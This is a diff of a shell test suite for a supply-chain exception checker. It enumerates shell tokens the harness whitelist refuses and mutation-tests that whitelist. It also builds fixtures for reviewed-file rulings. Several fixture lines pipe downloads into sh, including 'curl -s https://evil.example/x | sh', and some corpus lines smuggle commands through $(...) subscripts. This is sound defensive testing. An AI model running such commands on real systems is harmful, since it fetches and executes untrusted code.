-                env = {"PATH": st + os.pathsep + os.environ["PATH"], "HOME": d, "MARK": mark, "work": work, "CALLS": calls, "u": u, "LC_ALL": "C"}
-                try:
-                    subprocess.run([sh, "-c", 't() { shift 2; "$@"; }\n' + line], cwd=d, env=env, stdin=subprocess.DEVNULL, capture_output=True, timeout=20)
-                except subprocess.TimeoutExpired:
-                    pass
-                return os.path.exists(mark)
-            marks[ver] = {"plain": run(d, os.path.join(d, "calls"), "x"), "hostile": [h for h in HOSTILE if run(h, h, h)]}
-        verdict = subprocess.run([sys.executable, hfpy, line], capture_output=True, text=True, stdin=subprocess.DEVNULL)
-        out["lines"].append({"kind": kind, "what": what, "marked": any(m["plain"] for m in marks.values()),
-                             "marked_hostile": sorted({h for m in marks.values() for h in m["hostile"]}), "by_shell": marks,
-                             "refused": verdict.returncode == 1 and verdict.stdout.startswith("refused: "),
-                             "accepted": verdict.returncode == 0 and verdict.stdout.startswith("harness assertion")})
-json.dump(out, open(os.path.join(w, "hf-run.json"), "w"), indent=1)
-PY
-python3 "$work/hf_run.py" "$work/harness_form.py" "$work" </dev/null
-hfr() { python3 - "$work/hf-run.json" "$1" <<'PY'
-import json, sys
-r = json.load(open(sys.argv[1])); L = r["lines"]; m = sys.argv[2]
-assert r["bash5"], "no bash 5 on PATH"
-if m == "marked-refused": bad = [x["what"] for x in L if (x["marked"] or x["marked_hostile"]) and not x["refused"]]
-elif m == "accepted-clean": bad = [x["what"] for x in L if (x["kind"] in ("accepted", "real")) and (x["marked"] or x["marked_hostile"] or not x["accepted"] and x["kind"] == "accepted")]; assert sum(x["kind"] == "real" for x in L) == sum(1 for l in open(sys.argv[1].replace("hf-run.json", "hf-real.txt")) if l.strip())
-elif m == "repros-mark":
-    bad = [x["what"] for x in L if x["what"].startswith(("Sonnet R1 reproduction", "test -v \"a[$(touch X)]\"", "[ -v \"x[$(cmd)]\" ]")) and not x["marked"]]
-    bad += [x["what"] for x in L if x["what"].startswith("Codex R1 reproduction") and not x["marked_hostile"]]
-    assert sum(x["what"].startswith(("Sonnet R1 reproduction", "Codex R1 reproduction")) for x in L) == 3
-print(sum(bool(x["marked"] or x["marked_hostile"]) for x in L), "of", len(L), "corpus lines wrote the marker (plain or hostile argument values); bad:", bad)
-assert not bad, bad
+rtext=$'#!/bin/sh\n# the stub replaces curl and wget on PATH (text, not a command)\necho "run wget https://example.invalid/x later"\n'
+pyw() { python3 -c 'import sys; print("import pathlib\npathlib.Path(%r).write_text(%r)" % (sys.argv[1], sys.argv[2]))' "$1" "$2"; }   # python that writes FILE with TEXT
+newcase rt "$(pyw bin/ruled.sh "$rtext")"
+newcase rtedit "$(pyw bin/ruled.sh "${rtext/later/soon}")"
+printf '{"exceptions": [], "unmeasured_text": [], "reviewed_files": [' >"$work/rt-badjson.json"; rc=0
+echo '{"exceptions": []}' >"$work/rt-nolist.json"; rc=0
+# the same lines many times: a row of the file rules every occurrence, whatever its count (no count field, no cap)
+newcase rt2 "$(pyw bin/ruled.sh "$rtext${rtext#*$'\n'}")"
+many=$rtext; for _ in $(seq 150); do many+=${rtext#*$'\n'}; done
+newcase rt3 "$(pyw bin/ruled.sh "$many")"
+# the row is bound to the WHOLE line, not to the one downloader segment it hashes (Sonnet, PR 273 round 1): the line from pull request 271
+# (bin/build-helpers-test.sh:46) whose middle segment is "\n curl -s https://evil.example/x"; that segment inside ANY other line is not ruled
+cat >"$work/sx-ruled.txt" <<'EOF'
+    same-step) printf '  - runs: |\n      curl -s https://evil.example/x | sh\n' | tee -a "$work/gr/a.yaml" >>"$work/gr/b.yaml";;
+EOF
+newcase sx "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt")")"
+newcase sxm "$(pyw bin/other-test.sh "$(cat "$work/sx-ruled.txt")")"
+# --- an EDITED line is an addition: 'added' is decided per (file, form, key, whole-line hash), not per key (Codex, PR 273 round 2) ---------------------------
+# twoc NAME FILE BASE-TEXT HEAD-TEXT: a copy of the base repository, a commit that writes FILE with BASE-TEXT, then a head commit with HEAD-TEXT
+twoc() {
+  rm -rf "$work/$1"; cp -R "$base" "$work/$1"
+  python3 - "$work/$1" "$2" "$3" "$4" <<'PY'
+import pathlib, subprocess, sys
+root, f, bt, ht = sys.argv[1:5]; p = pathlib.Path(root) / f; p.parent.mkdir(parents=True, exist_ok=True)
+g = lambda *a: subprocess.run(["git", "-C", root, "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
+p.write_text(bt); g("add", "-A"); g("commit", "-q", "-m", "base2")
+p.write_text(ht); g("add", "-A"); g("commit", "-q", "--allow-empty", "-m", "head")
 PY
 }
-CASE="AC16 harness runtime: a bash of version 5 or newer is on PATH (the runtime proof needs it)"
-check python3 -c "import json,sys; assert json.load(open(sys.argv[1]))['bash5']" "$work/hf-run.json"
-CASE="AC16 harness runtime: the planted reproductions (newline in the body, test -v / [ -v with a \$(...) subscript; Codex: a double-quoted body run with a quote-carrying \$CALLS) DO write the marker under bash 5: the harness detects a run"
-check hfr repros-mark
-CASE="AC16 harness runtime: every corpus line that wrote the marker when run is refused by the parser"
-check hfr marked-refused
-CASE="AC16 harness runtime: every accepted line (the corpus and every distinct committed real line) runs under bash 5 and writes no marker, with plain paths AND with \$work, \$CALLS and \$u set to quote-, substitution- and subscript-carrying values"
-check hfr accepted-clean
-hfr marked-refused >"$work/hf-run.summary" 2>&1 || true; cat "$work/hf-run.summary"
-CASE="AC16 harness runtime: the shells the corpus ran under are reported (one per bash version on PATH)"
-check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('shells:', r['shells']); assert r['shells']" "$work/hf-run.json"
-python3 -c "import json,sys; print('harness runtime shells:', json.load(open(sys.argv[1]))['shells'])" "$work/hf-run.json"
-# --- COMPLEMENT enumeration: every token class outside HARNESS_WHITELIST (every character, every bash keyword and builtin, external commands, every test
-# operator, grep options, every variable name bash lists plus the specials and near-misses of work / CALLS) in every position it can take (RULE, TITLE,
-# BODY command position, before a command, BODY argument, grep option, inside a double-quoted pattern, test operator, separator, after a pipe, as a
-# substitution, exit status, ARG name and path), plus the refused corpus. One case per class; each line must be refused.
-cat >"$work/hf_enum.py" <<'PY'
-import importlib.util, json, os, subprocess, sys
-# hf_enum.py JUDGE.py SKIP.py REFUSED.tsv OUT.json: every token class OUTSIDE SKIP's HARNESS_WHITELIST, in every position it can take, judged by JUDGE's parser.
-# The universe of tokens is fixed here (every character, every keyword and builtin bash lists, the external commands, every test operator, a broad set of grep
-# options, every variable name bash lists plus the specials), so widening the whitelist by one token turns an expected refusal into an acceptance.
-def load(p, n):
-    spec = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m
-J, S = load(sys.argv[1], "judge_mod"), load(sys.argv[2], "skip_mod")
-W = S.HARNESS_WHITELIST
-def bash_lists():
-    for d in os.environ.get("PATH", "").split(os.pathsep):
-        p = os.path.join(d, "bash")
-        if d and os.access(p, os.X_OK):
-            r = subprocess.run([p, "-c", "echo ${BASH_VERSINFO[0]}"], capture_output=True, text=True, stdin=subprocess.DEVNULL)
-            if r.returncode == 0 and r.stdout.strip().isdigit() and int(r.stdout) >= 5:
-                g = lambda f: subprocess.run(["env", "-i", p, "--norc", "--noprofile", "-c", "compgen " + f], capture_output=True, text=True, stdin=subprocess.DEVNULL).stdout.split()
-                return g("-k"), g("-b"), g("-v")
-    return [], [], []
-kw, bi, vs = bash_lists()
-KEYWORDS = sorted(set(kw) | {"if", "then", "else", "elif", "fi", "case", "esac", "for", "select", "while", "until", "do", "done", "in", "function", "time", "coproc", "{", "}", "!", "[[", "]]"})
-BUILTINS = sorted(set(bi) | {"eval", "source", ".", "exec", "command", "builtin", "let", "declare", "typeset", "local", "readonly", "export", "read", "mapfile", "readarray",
-                             "printf", "echo", "set", "unset", "shift", "trap", "alias", "enable", "hash", "type", "cd", "pushd", "ulimit", "umask", "wait", "kill", "true", "false", ":"})
-EXTERNAL = ["curl", "wget", "sh", "bash", "zsh", "dash", "python3", "perl", "ruby", "node", "nc", "ssh", "scp", "env", "xargs", "find", "awk", "sed", "tee", "dd", "rm", "cp",
-            "mv", "ln", "chmod", "ls", "touch", "cmd", "git", "gh", "openssl", "base64", "tar", "unzip", "install", "sudo", "nohup", "timeout", "watch", "egrep", "fgrep", "zgrep"]
-WORDS = sorted(set(KEYWORDS + BUILTINS + EXTERNAL) | {"$x", "$1", "$(cmd)", "`cmd`", "${x}", "$[1]", "$((1))", "a[1]", "x=1", "*", "?", "~", "-", "--", "'a'", "\\a"})
-TEST_OPS = ["-a", "-b", "-c", "-d", "-e", "-f", "-g", "-h", "-k", "-p", "-r", "-s", "-t", "-u", "-w", "-x", "-G", "-L", "-N", "-O", "-S", "-z", "-n", "-o", "-v", "-R",
-            "=", "==", "!=", "<", ">", "=~", "-ef", "-nt", "-ot", "-eq", "-ne", "-lt", "-le", "-gt", "-ge", "!", "(", ")", "-A", "-l"]
-GREP_OPTS = ["-f", "-e", "-r", "-R", "-P", "-z", "-o", "-l", "-L", "-n", "-c", "-i", "-x", "-w", "-F", "-G", "-A", "-B", "-C", "-H", "-h", "-s", "-U", "-a", "-I", "-m", "-b",
-             "-d", "-D", "-T", "-Z", "--file", "--file=x", "--include=*", "--exclude=*", "--null", "--color", "--regexp", "--recursive", "-Ef", "-qf", "-E", "-q", "-v", "-Eq", "-vq", "--"]
-VARS = sorted(set(vs) | {"0", "1", "9", "@", "*", "#", "?", "-", "$", "!", "_", "HOME", "PATH", "IFS", "BASH_ENV", "ENV", "PS4", "u", "x", "other", "Work", "works",
-                         "WORK", "CALL", "calls", "CALLS2", "CALLSx", "wor", "w"})
-CHARS = [chr(c) for c in range(128)] + ["é", " ", " ", "﻿"]
-SEPS = ["&", ";;", "|&", "&>", ">", "<", ">>", "<<", "<<<", ">|", "<>", "(", ")", "{", "}", "`", "\n", "\r", "&&&", "|||", ";&", ";;&"] + CHARS
-EXITS = ["10", "-1", "x", "1 2", "01", "\"1\"", "$x", "256", "9 9", "\"$1\""] + [c for c in CHARS]
-BODY = lambda b, args=' _ "$CALLS"': "t \"r\" \"x\" bash -c '" + b + "'" + args
-L = []
-def case(cls, line, reason=None): L.append((cls, line, reason))
-for c in CHARS:
-    if c not in W["rule_title_chars"]:
-        case("a character outside rule_title_chars, in the RULE", 't "r' + c + '" "x" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
-        case("a character outside rule_title_chars, in the TITLE", 't "r" "x' + c + '" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
-    if c not in W["line_chars"]:
-        case("a character outside line_chars (refused for that reason)", 't "r" "x' + c + '" bash -c \'grep -q . "$1"\' _ "$CALLS"', "line character set")
-    if c not in W["dquote_chars"]:
-        case("a character outside dquote_chars, in a double-quoted pattern", BODY('grep -q -- "a' + c + 'b" "$1"'))
-    if "\\" + c not in W["dquote_escapes"]:
-        case("a backslash sequence outside dquote_escapes", BODY('grep -q -- "a\\' + c + 'b" "$1"'))
-    if c not in " \t" and c not in W["grep_options"] and c not in W["grep_bare_patterns"]:
-        case("a character as an unquoted grep pattern", BODY('grep -q -- ' + c + ' "$1"'))
-        if c not in W["grep_options"]:
-            case("a character as an unquoted grep option", BODY('grep -q ' + c + ' -- "a" "$1"'))
-    if c not in " \t":
-        case("a character in BODY command position", BODY(c + ' "$1"'))
-        case("a character glued to a command word", BODY('grep' + c + ' -q -- . "$1"'))
-    if c not in W["arg_path_chars"]:
-        case("a character outside arg_path_chars, in an ARG path", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$CALLS/x' + c + '"')
-for s in SEPS:
-    if s not in W["separators"] and s not in " \t":
-        case("a separator outside separators", BODY('grep -q -- "a" "$1" ' + s + ' grep -q -- "b" "$1"'))
-for w in WORDS:
-    if w not in W["commands"]:
-        case("a word outside commands, in BODY command position", BODY(w + ' "$1"'))
-        case("a word outside commands, after a negation", BODY('! ' + w + ' "$1"'))
-    if w not in W["grep_options"] and w not in W["grep_bare_patterns"]:
-        case("a word as an unquoted grep option", BODY('grep -q ' + w + ' -- "a" "$1"'))
-        case("a word as an unquoted grep pattern", BODY('grep -q -- ' + w + ' "$1"'))
-    if w not in W["pipe_into"]:
-        case("a word outside pipe_into, after a pipe", BODY('grep -- "a" "$1" | ' + w + ' "$1"'))
-    if w not in W["substitutions"]:
-        case("a word outside substitutions, as a substitution command", BODY('test "$(' + w + ' -- "$1")" = "a"'))
-    case("a word as an unquoted ARG", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ ' + w)
-for w in sorted(set(WORDS) | set(CHARS)):
-    if w not in W["negation"] and w not in W["commands"] and w not in " \t":
-        case("a word before a command (outside negation)", BODY(w + ' grep -q -- . "$1"'))
-        case("a word before a test expression (outside negation)", BODY('test ' + w + ' -f "$1"'))
-for c in W["commands"]:
-    if c not in W["pipe_into"]:
-        case("a command outside pipe_into, after a pipe", BODY('grep -- "a" "$1" | ' + {"cat": 'cat -- "$1"', "test": 'test -f "$1"', "[": '[ -f "$1" ]', "exit": "exit 1"}.get(c, c + ' "$1"')))
-for o in TEST_OPS:
-    if o not in W["test_unary"]:
-        case("a test operator outside test_unary (OP X)", BODY('test ' + o + ' "$1"'))
-        case("a [ operator outside test_unary (OP X)", BODY('[ ' + o + ' "$1" ]'))
-    if o not in W["test_string"] and o not in W["test_count"]:
-        case("a test operator outside test_string / test_count (X OP Y)", BODY('test "$1" ' + o + ' "a"'))
-        case("a test operator outside test_string / test_count (N OP N)", BODY('test 1 ' + o + ' 2'))
-for o in GREP_OPTS:
-    if o not in W["grep_options"]:
-        case("a grep option outside grep_options", BODY('grep ' + o + ' -- "a" "$1"'))
-        case("a grep option outside grep_options, in the count substitution", BODY('test "$(grep -c ' + o + ' -- "a" "$1")" -ge 1'))
-for e in EXITS:
-    if e not in W["exit_status"] and e not in " \t":
-        case("an exit status outside exit_status", BODY('grep -q -- "a" "$1" && exit ' + e))
-for v in VARS:
-    if v not in W["arg_names"]:
-        case("a variable outside arg_names, as an ARG", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$' + v + '"')
-        case("a variable outside arg_names, as an ARG path", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$' + v + '/x"')
-        if not (len(v) == 1 and v in "123456789"):                    # "$1".."$9" whole is the positional the whitelist names
-            case("a variable in a double-quoted pattern", BODY('grep -q -- "$' + v + '" "$1"'))
-        case("a variable as an unquoted BODY argument", BODY('grep -q -- $' + v + ' "$1"'))
-        case("a variable in the TITLE", 't "r" "x $' + v + '" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
-QOPTS = sorted(set(GREP_OPTS) | {"--file=/etc/hosts", "--file=pats", "--version", "--pager=touch M", "--filter=cmd", "--view", "--regexp=x", "-e", "-f", "-r", "-E", "-q", "-v", "-Eq", "--", "-", "-c"})
-for o in QOPTS:
-    case("an option-like word DOUBLE-QUOTED in a grep option position", BODY('grep "' + o + '" -- "a" "$1"'))
-    case("an option-like word DOUBLE-QUOTED as the grep pattern", BODY('grep -q -- "' + o + '" "$1"'))
-    case("an option-like word DOUBLE-QUOTED as a grep file operand", BODY('grep -q -- "a" "' + o + '"'))
-    case("an option-like word DOUBLE-QUOTED in the count substitution's option position", BODY('test "$(grep -c "' + o + '" -- "a" "$1")" -ge 1'))
-    case("an option-like word DOUBLE-QUOTED as the count substitution's pattern", BODY('test "$(grep -c -- "' + o + '" "$1")" -ge 1'))
-    if o not in W["grep_options"] and o != W["end_of_options"]:
-        case("an option-like word BARE in a grep option position", BODY('grep -q ' + o + ' -- "a" "$1"'))
-        case("an option-like word BARE in the count substitution's option position", BODY('test "$(grep -c ' + o + ' -- "a" "$1")" -ge 1'))
-    case("an option-like word BARE after end_of_options (a second option, or a bare pattern)", BODY('grep -q -- ' + o + ' "a" "$1"'))
-    case("an option-like word as cat's operand", BODY('test "$(cat -- "' + o + '")" = "a"'))
-for op in W["test_unary"]:
-    for v in ('"/etc/passwd"', '"x"', '"$(cat -- "$1")"', '"$(grep -c -- "a" "$1")"', '1', '.', '"$2"'):
-        case("a file-test operand that is not a positional within the arguments", BODY('test ' + op + ' ' + v))
-        case("a file-test operand that is not a positional within the arguments, [ form", BODY('[ ' + op + ' ' + v + ' ]'))
-    case("a file test with an extra argument", BODY('test ' + op + ' "$1" "$1"'))
-for extra in ('"$1"', 'x', '"a"', '--'):
-    case("cat with more than one operand", BODY('test "$(cat -- "$1" ' + extra + ')" = "a"'))
-    case("cat with more than one operand, as a command", BODY('cat -- "$1" ' + extra))
-case("grep without end_of_options before the pattern", BODY('grep -q "a" "$1"'))
-case("grep without end_of_options, in the count substitution", BODY('test "$(grep -c "a" "$1")" -ge 1'))
-case("cat without end_of_options", BODY('test "$(cat "$1")" = "a"'))
-case("cat without end_of_options, as a command", BODY('cat "$1"'))
-case("more ARGs than max_args", 't "r" "x" bash -c \'grep -q -- . "$1"\' _' + ' "$CALLS"' * (W["max_args"] + 1))
-for l in open(sys.argv[3]).read().split("\n"):
-    if l:
-        what, line = l.split("\t", 1); case("the refused corpus: " + what, line)
-out = {"classes": {}, "total": len(L), "accepted": 0, "wrong_reason": 0}   # accepted: an expected refusal was ACCEPTED; wrong_reason: refused, but not for the expected reason
-for cls, line, reason in L:
-    d = out["classes"].setdefault(cls, {"n": 0, "accepted": [], "wrong_reason": []}); d["n"] += 1
-    try:
-        J.judge(line)
-    except J.Refused as e:
-        if reason is not None and reason not in str(e):
-            d["wrong_reason"].append(repr(line)[:160]); out["wrong_reason"] += 1
-        continue
-    d["accepted"].append(repr(line)[:160]); out["accepted"] += 1
-json.dump(out, open(sys.argv[4], "w"), indent=1)
-PY
-python3 "$work/hf_enum.py" "$work/harness_form.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$work/hf-enum.json" </dev/null
-python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('harness enumeration:', r['total'], 'lines in', len(r['classes']), 'classes,', r['accepted'], 'unexpectedly accepted,', r['wrong_reason'], 'refused for another reason')" "$work/hf-enum.json"
-while IFS= read -r cls; do
-  CASE="AC16 harness enumeration: refused in every case ($cls)"
-  check python3 -c "import json,sys; d=json.load(open(sys.argv[1]))['classes'][sys.argv[2]]; assert d['n'] > 0 and not d['accepted'] and not d['wrong_reason'], (d['accepted'][:5], d['wrong_reason'][:5])" "$work/hf-enum.json" "$cls"
-done < <(python3 -c "import json,sys; [print(k) for k in json.load(open(sys.argv[1]))['classes'] if not k.startswith('the refused corpus: ')]" "$work/hf-enum.json")
-CASE="AC16 harness enumeration: at least 3000 lines in at least 30 classes, none accepted and none refused for another reason"
-check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['total'] >= 3000 and len([k for k in r['classes'] if not k.startswith('the refused')]) >= 30 and r['accepted'] == 0 and r['wrong_reason'] == 0, (r['total'], r['accepted'], r['wrong_reason'])" "$work/hf-enum.json"
-# --- CODE mutants: the role rules that live in the parser's code are loosened one at a time in a temp copy; the enumeration and the refused corpus must
-# then find an unexpected acceptance (or a refusal for another reason). A surviving mutant means no case pins that rule.
-hcm=$(mktemp -d "$work/hfcode.XXXXXX")
-while IFS=$'\t' read -r what old new; do
-  python3 - "$work/harness_form.py" "$hcm/m.py" "$old" "$new" <<'PY'
-import sys
-s = open(sys.argv[1]).read(); assert s.count(sys.argv[3]) == 1, sys.argv[3]
-open(sys.argv[2], "w").write(s.replace(sys.argv[3], sys.argv[4]))
-PY
-  python3 "$work/hf_enum.py" "$hcm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hcm/e.json" </dev/null
-  CASE="AC16 harness code mutant: $what is caught (an unexpected acceptance, or a refusal for another reason)"
-  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] > 0 or r['wrong_reason'] > 0, r" "$hcm/e.json"
-done <<'EOF'
-a file-test operand may be any operand (Codex R6)	args[0][1] in W["test_unary"] and args[1][2] == "pos": return	args[0][1] in W["test_unary"] and operand(args[1]): return
-cat takes at least, not exactly, its operands (Sonnet R6)	if len(rest) != len(want) or any(	if len(rest) < len(want) or any(
-a positional may name an argument that is not there	if t[2] == "pos" and int(t[1]) > len(args): raise	if t[2] == "pos" and int(t[1]) > 9: raise
-EOF
-# --- MUTATION run (like pip-pin's): a temp copy of harness_form.py with HARNESS_WHITELIST widened by ONE token; the enumeration (positions and skips from
-# the real whitelist) and the refused corpus must then report at least one line the real whitelist refuses for the expected reason that the mutant either
-# ACCEPTS (an unexpected acceptance) or refuses for ANOTHER reason (the newline and CR line_chars mutants: the shape still refuses those lines, so they
-# change the reason, not the verdict). The two counts are reported apart. A mutant with neither means the suite does not pin the whitelist.
-cat >"$work/hf-mut.tsv" <<'EOF'
-commands + curl	HARNESS_WHITELIST["commands"].append("curl")
-commands + sh	HARNESS_WHITELIST["commands"].append("sh")
-commands + eval	HARNESS_WHITELIST["commands"].append("eval")
-commands + bash	HARNESS_WHITELIST["commands"].append("bash")
-test_unary + -v	HARNESS_WHITELIST["test_unary"].append("-v")
-test_unary + -R	HARNESS_WHITELIST["test_unary"].append("-R")
-test_unary + -n	HARNESS_WHITELIST["test_unary"].append("-n")
-test_string + ==	HARNESS_WHITELIST["test_string"].append("==")
-test_count + -nt	HARNESS_WHITELIST["test_count"].append("-nt")
-arg_names + other	HARNESS_WHITELIST["arg_names"].append("other")
-arg_names + HOME	HARNESS_WHITELIST["arg_names"].append("HOME")
-separators + &	HARNESS_WHITELIST["separators"].append("&")
-separators + >	HARNESS_WHITELIST["separators"].append(">")
-pipe_into + cat	HARNESS_WHITELIST["pipe_into"].append("cat")
-grep_options + -f	HARNESS_WHITELIST["grep_options"].append("-f")
-grep_options + -e	HARNESS_WHITELIST["grep_options"].append("-e")
-grep_bare_patterns + *	HARNESS_WHITELIST["grep_bare_patterns"].append("*")
-exit_status + 10	HARNESS_WHITELIST["exit_status"].append("10")
-rule_title_chars + $	HARNESS_WHITELIST["rule_title_chars"] += "$"
-rule_title_chars + backtick	HARNESS_WHITELIST["rule_title_chars"] += "`"
-rule_title_chars + '	HARNESS_WHITELIST["rule_title_chars"] += "'"
-dquote_chars + $	HARNESS_WHITELIST["dquote_chars"] += "$"
-dquote_chars + backtick	HARNESS_WHITELIST["dquote_chars"] += "`"
-dquote_chars + backslash	HARNESS_WHITELIST["dquote_chars"] += "\\"
-dquote_chars + !	HARNESS_WHITELIST["dquote_chars"] += "!"
-dquote_escapes + \$	HARNESS_WHITELIST["dquote_escapes"].append("\\$")
-line_chars + newline	HARNESS_WHITELIST["line_chars"] += "\n"
-line_chars + CR	HARNESS_WHITELIST["line_chars"] += "\r"
-arg_path_chars + *	HARNESS_WHITELIST["arg_path_chars"] += "*"
-arg_path_chars + $	HARNESS_WHITELIST["arg_path_chars"] += "$"
-substitutions + ls	HARNESS_WHITELIST["substitutions"]["ls"] = ""
-max_args 9 -> 10	HARNESS_WHITELIST["max_args"] = 10
-negation + -	HARNESS_WHITELIST["negation"].append("-")
-end_of_options not required	HARNESS_WHITELIST["end_of_options"] = ""
-pattern may start with -	HARNESS_WHITELIST["pattern_first_char_not"] = ""
-grep_options + --file=pats	HARNESS_WHITELIST["grep_options"].append("--file=pats")
-dquote_escapes + \-	HARNESS_WHITELIST["dquote_escapes"].append("\\-")
-EOF
-hfm=$(mktemp -d "$work/hfmut.XXXXXX")
-while IFS=$'\t' read -r what patch; do
-  python3 - "$work/harness_form.py" "$hfm/m.py" "$patch" <<'PY'
-import sys
-s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"; assert s.count(m) == 1
-open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
-PY
-  python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null; cp "$hfm/e.json" "$hfm/e-$what.json"
-  CASE="AC16 harness mutation: widening HARNESS_WHITELIST by one token ($what) is caught (an unexpected acceptance, or a refusal for another reason)"
-  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] > 0 or r['wrong_reason'] > 0, r" "$hfm/e.json"
-  python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('harness mutation', sys.argv[2] + ':', r['accepted'], 'unexpectedly accepted,', r['wrong_reason'], 'refused for another reason')" "$hfm/e.json" "$what"
-done <"$work/hf-mut.tsv"
-CASE="AC16 harness mutation: the enumeration reports unexpected acceptances and refusals for a different reason separately (fields accepted and wrong_reason)"
-check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert 'wrong_reason' in r and 'accepted' in r and all('accepted' in d and 'wrong_reason' in d for d in r['classes'].values())" "$work/hf-enum.json"
-for m in newline CR; do
-  CASE="AC16 harness mutation: line_chars + $m is caught as refusals for a different reason, with 0 unexpected acceptances (the shape still refuses the line)"
-  check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] == 0 and r['wrong_reason'] > 0, (r['accepted'], r.get('wrong_reason'))" "$hfm/e-line_chars + $m.json"
-done
-CASE="AC16 harness mutation: the unmutated copy (a no-op patch) is NOT flagged (the mutation run detects widening, not noise)"
-python3 - "$work/harness_form.py" "$hfm/m.py" "pass" <<'PY'
-import sys
-s = open(sys.argv[1]).read(); m = "# END HARNESS_WHITELIST\n"
-open(sys.argv[2], "w").write(s.replace(m, m + sys.argv[3] + "\n"))
-PY
-python3 "$work/hf_enum.py" "$hfm/m.py" "$work/harness_form.py" "$work/hf-refused.tsv" "$hfm/e.json" </dev/null
-check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['accepted'] == 0 and r['wrong_reason'] == 0, r" "$hfm/e.json"
-CASE="plain-old-prefixes: no committed row begins with an old prefix"
-check python3 - "$root/.github/supply-chain-exceptions.json" <<'PY'
+# mkrow OUT FILE TEXT: the exceptions file with a reviewed_files row for FILE (TEXT is the text the file was reviewed with)
+mkrow() {
+  python3 - "$@" <<'PY'
 import json, sys
-OLD = ("pinned toolchain fetch, advisor reading Oct 16", "loopback fetch, advisor reading Oct 17",
-       "pinned fetch, advisor reading Oct 17")
-rows = json.load(open(sys.argv[1]))["unmeasured_text"]
-rows = [r["line"][:12] for r in rows if r["ruling"].startswith(OLD)]
-assert not rows, rows
+out, f = sys.argv[1:3]
+json.dump({"exceptions": [], "unmeasured_text": [], "reviewed_files": [{"file": f, "ruling": "reviewed file: a test fixture"}]}, open(out, "w"))
 PY
-CASE="AC16: the default rulings path is the script's own checkout (.github/supply-chain-exceptions.json beside .github/agent), whatever --root says"
-check python3 - "$chk" "$root" <<'PY'
-import importlib.util, os, sys
-spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
-assert os.path.realpath(ac.DEFAULT_EXCEPTIONS) == os.path.realpath(os.path.join(sys.argv[2], ".github", "supply-chain-exceptions.json")), ac.DEFAULT_EXCEPTIONS
-PY
-CASE="the committed build-container install row is exactly the one apk line of bin/acceptance-egress.sh (file, form, key and line equal the hash of the whole line, no count, no context) and there is at most one; the line sits in a container whose image is pinned by digest"
-check python3 - "$root/.github/supply-chain-exceptions.json" "$root/bin/acceptance-egress.sh" <<'PY'
-import hashlib, json, os, re, sys
-rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["ruling"].startswith("build-container install, test-only: ")]
-assert len(rows) <= 1, rows
-line = "apk add --no-cache build-base=0.5-r3 linux-headers=6.6-r0 xz=5.8.3-r0 >/dev/null"
-h = hashlib.sha256(line.encode()).hexdigest()
-for r in rows:
-    assert r["file"] == "bin/acceptance-egress.sh" and r["form"] == "a system package install" and r["key"] == r["line"] == h and "count" not in r and "context" not in r, r
-    if os.path.exists(sys.argv[2]):      # the file arrives with the release chain (not on every branch): where it is present, the line is in it once and the container that runs it is a digest-pinned image
-        src = open(sys.argv[2]).read()
-        assert src.count(line) == 1, "the apk line is not in the file exactly once"
-        pre = src.split(line)[0].rsplit("docker run", 1)[1]
-        assert re.search(r"alpine:[0-9.]+@sha256:[0-9a-f]{64}", pre), "the image of the container is not pinned by digest"
-PY
-
-# a context row of the local-call form is malformed (exit 2): those rows name an item, and their check does not take a context
-python3 - "$chk" <<'PY' >/dev/null 2>&1 && ok "AC16 context: a local-call row that carries a context or proof is malformed (RuntimeError, exit 2)" || bad "AC16 context: a local-call row that carries a context or proof is malformed (RuntimeError, exit 2)"
-import importlib.util, json, sys, tempfile
-spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
-h = "a" * 64
-for extra in ({"context": "assignment"}, {"context": "assignment", "proof": "x"}):
-    row = dict({"file": ".github/workflows/x.yml", "form": ac.LOCAL_CALL_FORM, "key": h, "line": h, "ruling": "local reusable workflow call; test"}, **extra)
-    with tempfile.NamedTemporaryFile("w", suffix=".json") as f:
-        json.dump({"unmeasured_text": [row]}, f); f.flush()
-        try:
-            ac.load_ruled_text(f.name, required=True)
-        except RuntimeError:
-            continue
-        raise SystemExit("accepted")
-PY
-
+}
+echo '{"exceptions": [], "unmeasured_text": [], "reviewed_files": []}' >"$work/rt-empty.json"
+mkrow "$work/rt-codex.json" bin/ruled.sh $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n'
+twoc cx bin/ruled.sh $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n' $'#!/bin/sh\necho \'curl https://example.invalid/x\' | sh\n'
+twoc pre tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a | sh\n'
